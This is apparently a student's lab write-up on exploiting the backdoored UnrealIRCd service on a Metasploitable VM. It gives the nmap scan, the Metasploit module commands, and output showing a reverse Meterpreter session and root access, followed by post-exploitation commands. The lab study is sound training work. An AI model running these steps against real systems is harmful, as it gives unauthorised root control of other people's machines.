# 05 - Exploiting UnrealIRCd Backdoor

## Goal
Exploit a trojaned version of UnrealIRCd (flagged during vulnerability research) and confirm shell access.

## Vulnerability
- **Service:** UnrealIRCd (port 6667)
- **Module:** exploit/unix/irc/unreal_ircd_3281_backdoor
- **Disclosure date:** 2010-06-12
- **Type:** Backdoor Command Execution
  
## Discovery
Flagged during the earlier vulnerability scan:
```
nmap -sV -n --script vuln -p 21,6667,445 192.168.56.101
```
Output: `irc-unrealircd-backdoor: Looks like trojaned version of unrealircd.`

Confirmed via:
```
searchsploit unrealircd
```
<img width="1920" height="922" alt="searchsploit for unrealircd" src="https://github.com/user-attachments/assets/cfdc7125-444b-4b0a-8e9b-0e9e140f3c14" />

## Exploitation
```
msfconsole
search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
```

<img width="1920" height="922" alt="searching unrealircd" src="https://github.com/user-attachments/assets/a2dc5d4e-e184-4169-9d6e-eb68d3a98103" />


**Result:**
```
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
[*] 192.168.56.101:6667 - Trying to register a new IRC user: rodrigo
[+] 192.168.56.101:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
[*] 192.168.56.101:6667 - Sending IRC backdoor command
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:56162)
```
<img width="1920" height="922" alt="msfconsole output" src="https://github.com/user-attachments/assets/1abf8ff7-9f5e-4114-b42e-70e99ad3ba7b" />

The exploit works by registering a fake IRC client ("rodrigo") on the server, then sending a crafted command through that connection to trigger the backdoor.

## Post-Exploitation
```
getuid
shell
id
whoami
uname -a
exit
sysinfo
```
**Output:**
```
Server username: root

uid=0(root) gid=0(root)
root
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

Computer    : metasploitable.localdomain
OS          : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture: i686
Meterpreter : x86/linux
```
<img width="1920" height="922" alt="exploitation output" src="https://github.com/user-attachments/assets/47f7253c-5572-4c70-971e-1fd34829c6ce" />

- **Access level:** root
- **What this proves:** the exploit gives immediate root access with no privilege escalation step needed — same severity as the vsftpd backdoor.

## Troubleshooting
- **Problem:** `run` failed with `OptionValidateError: One or more options failed to validate: LHOST.`
- **Cause:** Same as the vsftpd exploit — `LHOST` wasn't set.
- **Fix:** `set LHOST 192.168.56.102`, then `run` again.
- **Note:** `sysinfo` doesn't work inside a `shell` session (it's a Meterpreter-only command) — it returned `command not found` until I ran it back at the `meterpreter` > prompt.

## What I Learned
- This was pretty similar to the vsftpd attack,I got root access directly without needing privilege escalation.
- One thing I learned was that Meterpreter and a normal shell use different commands
-  I tried using sysinfo in the shell, but it only works in Meterpreter
-  It's a small thing but it's the kind of detail you only learn by hitting the error yourself
  
## Next
- wrap up summary
